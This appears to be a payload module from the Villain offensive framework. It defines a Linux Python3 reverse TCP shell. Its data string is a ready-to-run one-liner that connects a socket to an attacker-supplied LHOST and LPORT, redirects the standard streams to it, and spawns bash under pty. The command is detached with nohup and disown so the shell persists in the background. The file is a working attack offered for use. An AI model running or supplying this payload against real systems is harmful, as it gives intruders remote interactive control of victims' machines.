# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Linux Python3 reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Classic Python3 reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'python3-reverse-tcp',
        'os' : 'linux'   
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = "export LHOST=\"*LHOST*\"; export LPORT=*LPORT*; nohup python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"LHOST\"),int(os.getenv(\"LPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")' > /dev/null 2>&1 & disown"
